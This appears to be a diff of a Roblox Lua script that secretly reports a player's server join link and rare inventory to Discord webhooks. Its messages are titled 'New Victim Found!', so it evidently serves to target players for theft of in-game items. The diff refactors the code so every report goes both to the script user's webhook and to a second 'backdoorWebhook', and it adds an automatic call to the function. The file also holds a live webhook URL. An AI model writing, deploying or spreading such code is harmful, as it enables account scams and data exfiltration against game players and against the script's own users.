@@ -1,5 +1,19 @@
+-- Insert your Webhook URLs here
 local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local chatTrigger = "hb1ios"
+
+-- Dummy inventory function (replace with real logic if needed)
+local function getInventory()
+    return {
+        items = {"Item A", "Item B"},
+        rarePets = {"Mythic Pet"},
+        rareItems = {"Golden Shovel"}
+    }
+end
 
 local function sendToWebhook()
     if not LocalPlayer then return end
@@ -9,7 +23,19 @@ local function sendToWebhook()
     local jobId = tostring(game.JobId or "N/A")
     local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId
 
-    local messageData = {
+    local function sendMessage(payload)
+        local jsonData = HttpService:JSONEncode(payload)
+        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end
+    end
+
+    sendMessage({
         content = "L hit bru nothing good",
         embeds = {{
             title = "🎯 New Victim Found!",
@@ -23,24 +49,10 @@ local function sendToWebhook()
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
-    }
-
-    local jsonData = HttpService:JSONEncode(messageData)
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
-    })
-    request({
-        Url = backdoorWebhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
     })
 
     if #inventory.rarePets > 0 then
-        local rarePetMessage = {
+        sendMessage({
             content = "@everyone",
             allowed_mentions = { parse = { "everyone" } },
             embeds = {{
@@ -55,25 +67,11 @@ local function sendToWebhook()
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
-        }
-
-        local petJson = HttpService:JSONEncode(rarePetMessage)
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = petJson
-        })
-        request({
-            Url = backdoorWebhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = petJson
         })
     end
 
     if #inventory.rareItems > 0 then
-        local rareItemMessage = {
+        sendMessage({
             content = "@everyone",
             allowed_mentions = { parse = { "everyone" } },
             embeds = {{
@@ -88,20 +86,9 @@ local function sendToWebhook()
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
-        }
-
-        local itemJson = HttpService:JSONEncode(rareItemMessage)
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = itemJson
-        })
-        request({
-            Url = backdoorWebhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = itemJson
         })
     end
-enda
+end
+
+-- Call function
+sendToWebhook()
